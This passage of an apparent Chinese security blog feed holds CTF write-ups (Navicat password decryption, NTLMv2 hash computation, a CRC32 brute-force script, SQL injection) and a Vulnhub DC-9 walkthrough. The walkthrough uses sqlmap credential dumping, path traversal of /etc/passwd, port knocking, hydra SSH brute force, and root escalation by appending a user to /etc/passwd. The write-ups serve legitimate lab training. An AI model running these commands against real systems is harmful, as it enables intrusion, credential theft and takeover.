&#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function xorBytes($str1, $str2)    &#123;        $result = &#39;&#39;;        for ($i = 0; $i &lt; strlen($str1); $i++) &#123;            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));        &#125;                 return $result;    &#125;         protected function encryptTwelve($string)    &#123;        $result = openssl_encrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);        return strtoupper(bin2hex($result));    &#125;         public function decrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;decryptEleven($string);                break;            case 12:                $result = $this-&gt;decryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function decryptEleven($upperString)    &#123;        $string = hex2bin(strtolower($upperString));                 $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $encryptedBlock = substr($string, 8 * $i, 8);            $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector);            $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return $result;    &#125;         protected function decryptTwelve($upperString)    &#123;        $string = hex2bin(strtolower($upperString));        return openssl_decrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);    &#125;&#125;;  //需要指定版本两种，11或12//$navicatPassword = new NavicatPassword(11);$navicatPassword = new NavicatPassword(11); //解密//$decode = $navicatPassword-&gt;decrypt(&#39;15057D7BA390&#39;);$decode = $navicatPassword-&gt;decrypt(&#39;FB916DAFA4CE92143350DCF66AE9&#39;); // navicat密钥echo $decode.&quot;\n&quot;;?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226757.png" alt="image-20240429212426207"></p><p>拿到第三部分</p><pre><code>-185817e5f846&#125;</code></pre><p>合起来</p><pre><code>flag&#123;ef63fcbc-3467-834f-f797-185817e5f846&#125;</code></pre><h2 id="Strangesystem-NTLMv2哈希计算"><a href="#Strangesystem-NTLMv2哈希计算" class="headerlink" title="Strangesystem(NTLMv2哈希计算)"></a>Strangesystem(NTLMv2哈希计算)</h2><pre><code>你是一名安全防护人员，你发现有人成功入侵了公司的服务器，你查找有关的流量设备，发现了一个流量包文件，你认为它可能包含了一些重要的信息。但是当你打开它时，你发现它被加密了：你觉得这个文件可能被某种奇怪的系统加密过，你想要找出加密算法并解密出文件内容。</code></pre><p>拿到一个流量 先看http导出 有张<code>q.png</code> 直接导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226598.png" alt="image-20240429153504477"></p><p>使用010打开 发现尾部存在压缩包 导出并保存 压缩包真加密存在解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226165.png" alt="image-20240429153736350"></p><p>看到压缩包尾部也存在额外信息 先留着 回来看流量包 QUIC协议的流量包存在加密 搜一下解密方法</p><p><a href="https://blog.csdn.net/qq_37177958/article/details/120476794">Wireshark对QUIC包的抓包和解包</a></p><p>简单来说 就是使用在抓包时获得的关于TLS握手信息的密钥日志文件 在wireshark编辑——首选项——Protocols——TLS 中将日志文件添加进(Pre)-Master-Secret   Log filename中就可以进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226671.png" alt="image-20240429155157374"></p><p>这个日志密钥文件 就是我们上面在压缩包后面发现的内容 将这部分信息另存为<code>sshkey.log</code>文件 放入上面提到的位置 就可以进行解密</p><pre><code>SERVER_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 82ec3ebf3131b2442d165bb00dd6b8d1a6b4c866daf3fd373c22d33886290ed2868a7395e691980b990de46b76a54f9eCLIENT_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 10965df426257a285c6e812ed54468c59437e77bceff2c3a6d633dacefadf8188e97c4935df6815e5398b24273addc79SERVER_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a cdbf7c7a161af7aa829b14becaa2c000b8183000983e06589fef0c50e9462cf71aeb487e1cb1defaef06a941234ea7a2CLIENT_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a e58e4088a7840d3991ac2336c581d2a35edbebfd14420a29c287444c3631dc98038b71f1d153cd37ba46164145a028fd</code></pre><p>解密之后追踪QUIC流 可以看到一组账密和一个html网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226193.png" alt="image-20240429155557247"></p><p>网页文件中的内容是</p><pre><code>admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000</code></pre><p>中间未知的部分是NETntlmv2的值 我们可以通过前面的一组账密和已知的ntlm值得到NETntlmv2的值 在此之前 我们先一起来学习一些概念 下面我是参考学习的文章</p><p><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></p><p><a href="https://en.wikipedia.org/wiki/NTLM">NTML</a></p><p><a href="https://medium.com/@notahades/what-is-ntlmv2-31153aa3102c">什么是NTMLv2</a></p><p><a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a></p><pre><code>NTLM 是一种质询-响应身份验证协议 NTLM 协议使用两个散列密码值中的一个或两个，这两个值也存储在服务器（或域控制器）上，并且通过缺少加盐，它们是等效的密码，这意味着如果您从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。这两个是LM 哈希（基于DES 的函数，应用于将密码的前 14 个字符转换为该语言的传统 8 位 PC 字符集）和 NT 哈希（小端UTF-16 Unicode密码的MD4 ） ）。两个哈希值均为 16 字节（128 位）。NTLM 协议还使用两个单向函数之一，具体取决于 NTLM 版本； NT LanMan 和 NTLM 版本 1 使用基于 DES 的 LanMan 单向功能 (LMOWF)，而 NTLMv2 使用基于 NT MD4的单向功能 (NTOWF)   这个MD4的加密方法后面也会提到</code></pre><pre><code>NTLM hash通常是指Windows系统下Security Account Manager中保存的用户密码hash该hash的生成方法：将明文口令转换成十六进制的格式转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位的十六进制数字串</code></pre><pre><code>NTLMv2（NT LAN Manager 版本 2） 也是一种质询-响应身份验证协议 NTLMv2 发送两个对 8 字节服务器质询的响应。每个响应包含服务器质询的16 字节HMAC - MD5哈希值、完全/部分随机生成的客户端质询以及用户密码和其他标识信息的 HMAC-MD5 哈希值。NTLMv2的主要功能：1.身份验证协议 2.质询-响应机制 3.散列和加密 NTLMv2 依赖加密技术来保护身份验证数据。它使用 HMAC-MD5（具有 MD5 哈希函数的基于哈希的消息身份验证代码）进行完整性检查，并使用 MD4进行加密。4.增强的安全性5.兼容性 NTLMv2也向后兼容NTML协议6.域身份验证</code></pre><pre><code>NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：1.客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash2.服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge13.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器4.服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功在以上流程中，登录用户的密码hash即NTLM hash，response中包含Net-NTLM hash这上面提到的NTLM包括NTLMv1 NTLMv2 NTLM sessionV2三种协议 不同协议使用不同格式的challenge和加密算法 因此也就区分出了NETntlmv1 hash和NETntlmv2 hashNTLMv2的格式是username::domain:challenge:HMAC-MD5:blob其中domain是IP或者机器名challenge是上面提到的服务器收到请求之后生成的随机数 体现在流量包中是NTLM Server ChallengeHMAC-MD5在流量包中体现为NTProofstrblob是上面提到的使用用户登陆的密码对challenge进行加密之后的challenge1(即response)的值去掉NTProofstr的部分</code></pre><p>那么对照上面说的NTLMv2的格式 我们这个题中<code>xxx</code>的部分很明显就是缺少了HMAC-MD5部分的值  好在我们有用户admin的登陆密码 可以计算出这部分缺失的值 同时计算出该用户的NTLMv2 hash值</p><p>下面是计算流程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226818.png" alt="image-20240429170531714"></p><p>计算方法参考<a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a>  我们使用python2和python3两个版本来实现这个计算过程</p><pre><code class="python"># python2# python2import hashlibimport binasciiimport hmacinput_ntml = raw_input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;,input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)input_user = raw_input(&quot;please input username:&quot;)input_domain = raw_input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = input_user_and_domain.upper().encode(&quot;utf-16-le&quot;).encode(&quot;hex&quot;)firstHMAC = hmac.new(ntlm.decode(&quot;hex&quot;), encode_user_and_domain.decode(&quot;hex&quot;), hashlib.md5).hexdigest()input_challange = raw_input(&quot;please input challenge:&quot;)input_blob = raw_input(&quot;please input blob:&quot;)type2challenge = input_challange + input_blobntlmv2 = hmac.new(firstHMAC.decode(&quot;hex&quot;), type2challenge.decode(&quot;hex&quot;), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot;+ ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226464.png" alt="image-20240429174403973"></p><pre><code class="python"># python3import hashlibimport binasciiimport hmac# 计算密码的ntlm hash值input_ntml = input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;, input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)# 计算用户名和域名的编码值input_user = input(&quot;please input username:&quot;)input_domain = input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = binascii.hexlify(input_user_and_domain.upper().encode(&quot;utf-16-le&quot;))# 计算HMAC-hash值firstHMAC = hmac.new(binascii.unhexlify(ntlm), binascii.unhexlify(encode_user_and_domain), hashlib.md5).hexdigest()# 计算NTLMv2 hash值input_challenge = input(&quot;please input challenge:&quot;)input_blob = input(&quot;please input blob:&quot;)type2challenge = input_challenge + input_blobntlmv2 = hmac.new(binascii.unhexlify(firstHMAC), binascii.unhexlify(type2challenge.encode()), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot; + ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226056.png" alt="image-20240429174433304"></p><p>最终算出admin用户的NTLMv2哈希值为<code>efa243f442b9d683eb1b00a2b1a0c9fc</code></p><p>使用这个值就可以解压压缩包 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226647.png" alt="image-20240429174554406"></p><h2 id="Wireshark2-1"><a href="#Wireshark2-1" class="headerlink" title="Wireshark2.1"></a>Wireshark2.1</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281640078.png" alt="image-20240428164034035"></p><p>很显然是theanswerishere.php</p><h2 id="Wireshark2-2"><a href="#Wireshark2-2" class="headerlink" title="Wireshark2.2"></a>Wireshark2.2</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281643179.png" alt="image-20240428164317144"></p><p>刚开始写的2 错误 输入3 对了</p><h2 id="Wireshark2-3"><a href="#Wireshark2-3" class="headerlink" title="Wireshark2.3"></a>Wireshark2.3</h2><pre><code>id=0%27%20union%20select%201,2,group_concat(th1sfI4g)%20from%20fl4g--+</code></pre><p>这句查询语句</p><p>很明显列名是th1sfI4g</p><h2 id="Wireshark2-4"><a href="#Wireshark2-4" class="headerlink" title="Wireshark2.4"></a>Wireshark2.4</h2><p>在最后一行直接追踪http流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281645495.png" alt="image-20240428164531407"></p><h2 id="WeirdUSB-1"><a href="#WeirdUSB-1" class="headerlink" title="WeirdUSB.1"></a>WeirdUSB.1</h2><p>使用取证大师分析 问下载 直接搜download</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281648437.png" alt="image-20240428164854359"></p><p>合并显示 发现目标文件名</p><pre><code>212633.crdownload</code></pre><h2 id="WeirdUSB-2"><a href="#WeirdUSB-2" class="headerlink" title="WeirdUSB.2"></a>WeirdUSB.2</h2><p>发现Area2&#x2F;Job2目录下的docx文件是唯一一个访问时间和修改时间相同的</p><p>猜测是该目录下的txt文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658734.png" alt="image-20240428165840676"></p><h2 id="fake-php"><a href="#fake-php" class="headerlink" title="fake_php"></a>fake_php</h2><p>随便输入一些 抓个包 看到要crc32校验</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281653267.png" alt="image-20240428165332188"></p><p>写个脚本进行爆破</p><pre><code class="python">import itertoolsimport zlib# 要匹配的CRC32校验值target_crc32 = 0xb4a5bb5a# 可能的字符集：大小写字母和数字chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#@!%$^&amp;*&#39;# 使用itertools.product生成所有可能的四位字符组合for combo in itertools.product(chars, repeat=4):    # 将字符元组转换为字符串    four_letter_combo = &#39;&#39;.join(combo) + &#39;-/flag&#39;    # 计算拼接字符串的CRC32校验值    crc32_result = zlib.crc32(four_letter_combo.encode(&#39;utf-8&#39;)) &amp; 0xffffffff    # 检查校验值是否与目标匹配    if crc32_result == target_crc32:        # 如果找到匹配，打印结果并停止        print(f&quot;Found matching string: &#123;four_letter_combo&#125;&quot;)        breakelse:    print(&quot;No matching string found.&quot;)</code></pre><p>爆到了S!@#</p><p>写入admin.php 抓包输入上面密码的url密码 得到adminS3cr3t.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281657577.png" alt="image-20240428165730488"></p><p>访问</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658968.png" alt="image-20240428165803920"></p><p>下面参照</p><p><a href="https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin">https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin</a></p><p>存在一个sql绕过 直接打poc 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658353.png" alt="image-20240428165822285"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数字中国&quot;&gt;&lt;a href=&quot;#2024数字中国&quot; class=&quot;headerlink&quot; title=&quot;2024数字中国&quot;&gt;&lt;/a&gt;2024数字中国&lt;/h1&gt;&lt;p&gt;被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一&lt;/p&gt;
&lt;p&gt;&lt;img src</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-9</title>
    <link href="http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/"/>
    <id>http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/</id>
    <published>2024-04-13T13:40:27.748Z</published>
    <updated>2024-04-17T06:46:12.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-9"><a href="#vulnhub靶场DC-9" class="headerlink" title="vulnhub靶场DC-9"></a>vulnhub靶场DC-9</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这次靶场描述没有给到什么信息</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132128103.png" alt="image-20240413212816063"></p><p>靶场ip为<code>192.168.204.138</code></p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.138</code></pre><p>只开放了tcp服务 80端口 使用Apache中间件 版本2.4.38</p><p>ssh服务此时显示的是filtered 被过滤了 这里是一个伏笔</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151949734.png" alt="image-20240415194924702"></p><p>再来扫一下指纹信息</p><pre><code>whatweb -v http://192.168.204.138/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132133436.png" alt="image-20240413213315387"></p><p>扫一下目录 </p><pre><code>python3 dirsearch.py -u http://192.168.204.138/ -i 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132137726.png" alt="image-20240413213735695"></p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151108793.png" alt="image-20240415110806734"></p><p>发现两个可能存在问题的页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130487.png" alt="image-20240415113001414"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130693.png" alt="image-20240415113006626"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>直接用xray扫一遍 </p><pre><code>.\xray_windows_amd64.exe webscan --basic-crawler http://192.168.204.138/ --html-output out.html</code></pre><p>查看out.html 看来是results.php页面存在sql注入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151150014.png" alt="image-20240415115022932"></p><p>直接上sqlmap</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; --dbs --level=5</code></pre><p>要写<code>--date &quot;search=123456&quot;</code> 参数是因为我们在search.php页面搜索框输入内容之后 会直接跳转到results.php 使用POST方法传入一个<code>search</code>参数</p><p>有三个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151509572.png" alt="image-20240415150917512"></p><p>先爆users数据库的表</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users --tables --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151510643.png" alt="image-20240415151047575"></p><p>爆字段 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails --columns --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151511447.png" alt="image-20240415151157366"></p><p>爆用户名和密码</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails -C &quot;password,username&quot; --dump --level=5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151513568.png" alt="image-20240415151306497"></p><p>得到了普通用户的用户名和密码</p><p>接着来爆Staff数据库 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff --tables --level=5python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --columns --level=5 python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --dump --level=5</code></pre><p>得到表中的admin用户密码是哈希值 但是sqlmap可以直接进行爆破 得到明文是<code>transorbital1</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151519482.png" alt="image-20240415151903397"></p><h4 id="登陆网站"><a href="#登陆网站" class="headerlink" title="登陆网站"></a>登陆网站</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520596.png" alt="image-20240415152003554"></p><p>使用上面爆破出来的密码成功登陆  但是看到下面的<code>File does not exist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520427.png" alt="image-20240415152026369"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>想到存在文件包含 </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/passwd</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151939819.png" alt="image-20240415193910763"></p><p>成功执行 发现其中的很多用户都在我们上面爆出来的数据库中的普通用户中出现过 </p><h3 id="三、ssh远程连接靶机"><a href="#三、ssh远程连接靶机" class="headerlink" title="三、ssh远程连接靶机"></a>三、ssh远程连接靶机</h3><h4 id="敲门服务"><a href="#敲门服务" class="headerlink" title="敲门服务"></a>敲门服务</h4><p>看到很多用户都在那我们应该尝试使用ssh进行连接靶机 但是之前我们在扫描端口的时候发现22端口开放的ssh服务显示的是被过滤的状态 搜一下这个情况</p><p><a href="https://cloud.tencent.com/developer/article/1782065">通过Knockd隐藏SSH，让黑客看不见你的服务器</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152002647.png" alt="image-20240415200255585"></p><p>看到是使用了knockd端口敲门服务 隐藏了ssh服务</p><p><a href="https://www.cnblogs.com/f-carey/p/16066178.html">knockd端口敲门服务</a></p><pre><code>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</code></pre><p>为了可以重新开启ssh服务 我们要查看敲门服务的配置文件<code>/etc/knockd.conf</code> </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/knockd.conf</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152006026.png" alt="image-20240415200604990"></p><p>我们可以从配置文件中得到出来敲门暗号的顺序 </p><pre><code>sequence = 7469,8475,9842  # 开启服务顺序sequence = 9842,8475,7469  # 关闭服务顺序</code></pre><p>下面我们就利用敲门暗号来开启被过滤的ssh服务</p><pre><code class="bash">apt install knockd  # 安装knockdsystemctl start knockd # 启动knockd服务knock 192.168.204.138 7469 8475 9842  # 使用暗号进行敲门nmap -A -p- 192.168.204.138  # 扫描靶机端口</code></pre><p>可以看到靶机的ssh服务成功被开启</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152021880.png" alt="image-20240415202126831"></p><h4 id="hydra爆破用户密码"><a href="#hydra爆破用户密码" class="headerlink" title="hydra爆破用户密码"></a>hydra爆破用户密码</h4><p>将刚刚数据库中的用户名和密码单独放到两个字典文件中 <font color='red'> 这里要注意 用户名和密码字典中每行用户名和密码后面千万不能有空格 否则是爆不出来的 <del>问就是血的教训QAQ</del></font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152034860.png" alt="image-20240415203445829"></p><p>使用hydra进行爆破</p><pre><code class="bash">hydra -L username.txt -P passwd.txt ssh://192.168.204.138</code></pre><p>爆破出三组用户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162108924.png" alt="image-20240416210803862"></p><pre><code>login: chandlerb   password: UrAG0D!login: joeyt   password: Passw0rdlogin: janitor   password: Ilovepeepee</code></pre><p>用这三个用户都登陆一下靶机 发现登陆到janitor靶机的时候 在登陆后的默认文件夹中有个隐藏文件夹 另外两个用户里面没有</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162121760.png" alt="image-20240416212109728"></p><p>进入文件夹 查看里面的文件<code>passwords-found-on-post-it-notes.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162122905.png" alt="image-20240416212217860"></p><p>看起来还是密码 将这几个密码放入刚才的密码字典中 在爆破一下 发现又爆破出一个用户<code>fredf</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162125625.png" alt="image-20240416212534564"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>用这个用户在ssh连接一下 执行<code>sudo -l</code>命令看一下可以使用的sudo权限命令 发现<code>/opt/devstuff/dist/test/test</code> 这个文件可以无密码以sudo权限执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162225736.png" alt="image-20240416222540670"></p><p>我们进入文件夹 读取一下这个文件的内容 是一个linux中的可执行程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162231229.png" alt="image-20240416223137150"></p><p>尝试运行 发现回显是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404171446154.png" alt="image-20240416223630531"></p><p>告诉了我们test.py的使用方法  那我们来找一下这个文件</p><pre><code>find / -name &quot;test.py&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162242150.png" alt="image-20240416224204963"></p><p>进行读取</p><pre><code class="python">#!/usr/bin/pythonimport sysif len (sys.argv) != 3 :    print (&quot;Usage: python test.py read append&quot;)    sys.exit (1)else :    f = open(sys.argv[1], &quot;r&quot;)    output = (f.read())    f = open(sys.argv[2], &quot;a&quot;)    f.write(output)    f.close()</code></pre><p>这段代码的意思就是读取参数1中的内容 将这个内容追加到参数2中 同时 运行时的参数不是3的话 就会报错</p><p>那我们就可以在创建一组用户名和密码 将这个内容写入&#x2F;etc&#x2F;passwd文件中 在切换用户 就可以获得root权限</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt admin admin# $1$admin$1kgWpnZpUx.vTroWPXPIB0</code></pre><p>利用test可执行程序将这个新用户添加到<code>/etc/passwd</code></p><pre><code>echo &#39;admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash&#39; &gt; /tmp/passwdsudo /opt/devstuff/dist/test/test  /tmp/passwd /etc/passwd</code></pre><p>在切换用户 已经是roo权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162313083.png" alt="image-20240416231342990"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162314972.png" alt="image-20240416231419833"></p><pre><code>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                             Congratulations - you have done well to get to this point.Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all thosewho have taken the time to complete the various DC challenges.I also want to send out a big thank you to the various members of @m0tl3ycr3w .They are an inspirational bunch of fellows.Sure, they might smell a bit, but...just kidding.  :-)Sadly, all things must come to an end, and this will be the last everchallenge in the DC series.So long, and thanks for all the fish.</code></pre><p>至此 我们拿到了flag  DC系列靶机也告一段落 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.xray扫到sql注入漏洞</p><p>2.sqlmap进行自动化注入 